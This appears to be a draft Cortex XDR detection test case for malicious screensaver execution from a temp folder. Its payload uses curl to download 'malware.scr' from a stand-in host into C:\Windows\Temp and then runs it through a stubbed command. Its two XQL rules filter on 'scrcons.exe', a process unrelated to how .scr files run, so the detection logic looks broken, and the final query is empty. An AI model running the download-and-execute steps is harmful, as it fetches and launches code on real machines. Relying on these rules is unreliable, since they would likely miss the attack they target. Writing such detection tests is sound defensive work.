identity.name: Screensaver Execution from Temporary Directory
identity.summary: An attacker places a malicious screensaver in a temporary folder and executes it to gain initial access. Cortex should detect the execution of a screensaver process from a non-standard location.
identity.description: An attacker places a malicious screensaver in a temporary folder and executes it to gain initial access. Cortex should detect the execution of a screensaver process from a non-standard location.

payload.code:
mkdir C:\Windows\Temp\malicious

curl -o C:\Windows\Temp\malicious\test.scr https://example.com/malware.scr

stubbed_cmd.exe C:\Windows\Temp\malicious\test.scr

expected_artifacts.description: Screensaver process executed from temporary folder

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Screensaver Process Executed from Users or Temp Folder
biocs.description: Detection of .scr file execution from a temporary or user directory
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'scrcons.exe'
| filter action_file_path contains 'Temp'
| filter action_file_path contains '.scr'

abiocs.name: Suspicious Screensaver Execution
abiocs.description: Behavioral deviation where a screensaver is executed from a temporary directory without user interaction
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'scrcons.exe'
| filter action_file_path contains 'Temp'
| filter causality_actor_process_image_name != 'explorer.exe'

xql_queries.name: Detect Suspicious SCR Execution
xql_queries.query:
